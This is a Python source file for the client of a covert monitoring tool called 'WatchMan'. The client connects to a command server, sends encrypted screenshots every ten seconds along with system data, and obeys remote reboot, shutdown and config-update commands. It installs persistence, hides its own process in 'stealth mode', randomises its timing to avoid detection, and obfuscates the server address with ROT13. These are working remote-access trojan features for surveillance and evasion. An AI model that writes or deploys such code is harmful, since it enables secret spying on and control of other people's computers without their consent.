"""
Main WatchMan client application.
Handles communication with server, system monitoring, and persistence.
"""
import sys
import os
import time
import threading
import json
import random
from datetime import datetime, timedelta
import socketio
import schedule

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shared import WatchManMessage, MessageType, Config, EncryptionManager, obfuscate_string, deobfuscate_string
from system_monitor import SystemMonitor
from screen_capture import ScreenCapture
from persistence import PersistenceManager

class WatchManClient:
    """Main client application for WatchMan system"""
    
    def __init__(self, config_path: str = None):
        # Load configuration
        if config_path is None:
            config_path = os.path.join(os.path.dirname(__file__), 'client_config.json')
        
        self.config = Config(config_path)
        self._load_default_config()
        
        # Initialize components
        self.system_monitor = SystemMonitor()
        self.screen_capture = ScreenCapture()
        self.persistence_manager = PersistenceManager()
        
        # Initialize encryption
        encryption_key = self.config.get('encryption_password', 'watchman2025')
        self.encryption = EncryptionManager(encryption_key)
        
        # Socket connection
        self.sio = socketio.Client()
        self.connected = False
        self.device_id = self.system_monitor.device_id
        
        # Control flags
        self.running = True
        self.stealth_mode = self.config.get('stealth_mode', True)
        
        # Setup socket handlers
        self._setup_socket_handlers()
        
        # Setup scheduled tasks
        self._setup_scheduler()
    
    def _load_default_config(self):
        """Load default client configuration"""
        # Obfuscated server address (decode at runtime)
        obfuscated_server = "uggc://127.0.0.1:5000"  # http://127.0.0.1:5000 with ROT13
        
        defaults = {
            'server_url': deobfuscate_string(obfuscated_server),
            'encryption_password': 'watchman2025',
            'heartbeat_interval': 30,
            'metrics_interval': 60,
            'screenshot_interval': 10,
            'stealth_mode': True,
            'persistence_enabled': True,
            'auto_startup': True,
            'ghost_operations': True,
            'max_reconnect_attempts': 10,
            'reconnect_delay': 5
        }
        
        for key, value in defaults.items():
            if not self.config.get(key):
                self.config.set(key, value)
        
        self.config.save_config()
    
    def _setup_socket_handlers(self):
        """Setup SocketIO event handlers"""
        
        @self.sio.event
        def connect():
            print("Connected to server")
            self.connected = True
            self._send_authentication()
            self._send_initial_system_info()
        
        @self.sio.event
        def disconnect():
            print("Disconnected from server")
            self.connected = False
        
        @self.sio.event
        def server_command(data):
            """Handle commands from server"""
            self._handle_server_command(data)
        
        @self.sio.on('*')
        def catch_all(event, data):
            print(f"Received event: {event}, data: {data}")
    
    def _setup_scheduler(self):
        """Setup scheduled tasks"""
        # Heartbeat
        heartbeat_interval = self.config.get('heartbeat_interval', 30)
        schedule.every(heartbeat_interval).seconds.do(self._send_heartbeat)
        
        # System metrics
        metrics_interval = self.config.get('metrics_interval', 60)
        schedule.every(metrics_interval).seconds.do(self._send_system_metrics)
        
        # Screenshots
        screenshot_interval = self.config.get('screenshot_interval', 10)
        schedule.every(screenshot_interval).seconds.do(self._send_screenshot)
    
    def _send_authentication(self):
        """Send authentication message to server"""
        auth_data = {
            'device_id': self.device_id,
            'hostname': self.system_monitor.hostname,
            'timestamp': datetime.utcnow().isoformat(),
            'version': '1.0'
        }
        
        message = WatchManMessage(MessageType.AUTHENTICATION, auth_data, self.device_id)
        self._send_encrypted_message(message)
    
    def _send_initial_system_info(self):
        """Send initial comprehensive system information"""
        system_data = self.system_monitor.get_all_metrics()
        system_data['connection_time'] = datetime.utcnow().isoformat()
        
        message = WatchManMessage(MessageType.SYSTEM_INFO, system_data, self.device_id)
        self._send_encrypted_message(message)
    
    def _send_heartbeat(self):
        """Send heartbeat to server"""
        if not self.connected:
            return
        
        heartbeat_data = {
            'status': 'alive',
            'timestamp': datetime.utcnow().isoformat(),
            'uptime': self.system_monitor.get_uptime()
        }
        
        message = WatchManMessage(MessageType.HEARTBEAT, heartbeat_data, self.device_id)
        self._send_encrypted_message(message)
    
    def _send_system_metrics(self):
        """Send current system metrics"""
        if not self.connected:
            return
        
        metrics = {
            'cpu_info': self.system_monitor.get_cpu_info(),
            'memory_info': self.system_monitor.get_memory_info(),
            'disk_info': self.system_monitor.get_disk_info(),
            'network_info': self.system_monitor.get_network_info(),
            'timestamp': datetime.utcnow().isoformat()
        }
        
        message = WatchManMessage(MessageType.SYSTEM_INFO, metrics, self.device_id)
        self._send_encrypted_message(message)
    
    def _send_screenshot(self):
        """Send screen capture to server"""
        if not self.connected:
            return
        
        try:
            image_data = self.screen_capture.capture_screen(compress=True)
            if image_data:
                screen_data = {
                    'image': image_data,
                    'screen_info': self.screen_capture.get_screen_info(),
                    'timestamp': datetime.utcnow().isoformat()
                }
                
                message = WatchManMessage(MessageType.SCREEN_CAPTURE, screen_data, self.device_id)
                self._send_encrypted_message(message)
        except Exception as e:
            print(f"Error sending screenshot: {e}")
    
    def _send_encrypted_message(self, message: WatchManMessage):
        """Send encrypted message to server"""
        try:
            json_message = message.to_json()
            encrypted_message = self.encryption.encrypt(json_message)
            self.sio.emit('client_message', encrypted_message)
        except Exception as e:
            print(f"Error sending message: {e}")
    
    def _handle_server_command(self, command_data):
        """Handle commands received from server"""
        try:
            command_type = command_data.get('type')
            
            if command_type == 'screenshot':
                self._send_screenshot()
            elif command_type == 'system_info':
                self._send_system_metrics()
            elif command_type == 'reboot':
                self._handle_reboot_command()
            elif command_type == 'shutdown':
                self._handle_shutdown_command()
            elif command_type == 'update_config':
                self._handle_config_update(command_data.get('config', {}))
            elif command_type == 'execute':
                self._handle_execute_command(command_data.get('command', ''))
            
        except Exception as e:
            print(f"Error handling server command: {e}")
    
    def _handle_reboot_command(self):
        """Handle reboot command"""
        if os.name == 'nt':  # Windows
            os.system('shutdown /r /t 10')
        else:  # Linux/macOS
            os.system('sudo reboot')
    
    def _handle_shutdown_command(self):
        """Handle shutdown command"""
        if os.name == 'nt':  # Windows
            os.system('shutdown /s /t 10')
        else:  # Linux/macOS
            os.system('sudo shutdown now')
    
    def _handle_config_update(self, new_config):
        """Handle configuration update"""
        self.config.update(new_config)
        self.config.save_config()
        print("Configuration updated")
    
    def _handle_execute_command(self, command):
        """Handle command execution (be very careful with this!)"""
        # This is dangerous - implement with extreme caution
        # Only allow whitelisted commands in production
        print(f"Command execution requested: {command}")
        # Implementation would go here with proper security measures
    
    def connect_to_server(self):
        """Connect to the WatchMan server"""
        server_url = self.config.get('server_url')
        max_attempts = self.config.get('max_reconnect_attempts', 10)
        reconnect_delay = self.config.get('reconnect_delay', 5)
        
        for attempt in range(max_attempts):
            try:
                print(f"Connecting to server (attempt {attempt + 1}/{max_attempts})")
                self.sio.connect(server_url)
                return True
            except Exception as e:
                print(f"Connection failed: {e}")
                if attempt < max_attempts - 1:
                    # Add some randomization to avoid thundering herd
                    delay = reconnect_delay + random.uniform(0, 5)
                    time.sleep(delay)
        
        return False
    
    def install_persistence(self):
        """Install persistence if enabled"""
        if self.config.get('persistence_enabled', True):
            success = self.persistence_manager.install_persistence()
            if success:
                print("Persistence installed successfully")
            else:
                print("Failed to install persistence")
    
    def run_scheduler(self):
        """Run the scheduler in a separate thread"""
        while self.running:
            try:
                schedule.run_pending()
                time.sleep(1)
            except Exception as e:
                print(f"Scheduler error: {e}")
    
    def maintain_connection(self):
        """Maintain connection to server with auto-reconnect"""
        while self.running:
            if not self.connected:
                print("Attempting to reconnect...")
                self.connect_to_server()
            
            time.sleep(30)  # Check every 30 seconds
    
    def enable_stealth_mode(self):
        """Enable stealth operations"""
        if self.stealth_mode:
            # Hide the process
            self.persistence_manager.hide_process()
            
            # Randomize timing to avoid detection
            base_intervals = {
                'heartbeat_interval': 30,
                'metrics_interval': 60,
                'screenshot_interval': 10
            }
            
            for key, base_value in base_intervals.items():
                # Add 20% randomization
                randomized = base_value + random.uniform(-base_value * 0.2, base_value * 0.2)
                self.config.set(key, int(randomized))
    
    def run(self):
        """Main run loop"""
        print(f"Starting WatchMan Client - Device ID: {self.device_id}")
        
        # Enable stealth mode if configured
        if self.config.get('stealth_mode', True):
            self.enable_stealth_mode()
        
        # Install persistence if enabled
        if self.config.get('auto_startup', True):
            self.install_persistence()
        
        # Start scheduler thread
        scheduler_thread = threading.Thread(target=self.run_scheduler, daemon=True)
        scheduler_thread.start()
        
        # Start connection maintenance thread
        connection_thread = threading.Thread(target=self.maintain_connection, daemon=True)
        connection_thread.start()
        
        # Initial connection
        self.connect_to_server()
        
        try:
            # Main loop
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Shutting down...")
            self.running = False
            self.sio.disconnect()

def main():
    """Main entry point"""
    client = WatchManClient()
    client.run()

if __name__ == '__main__':
    main()
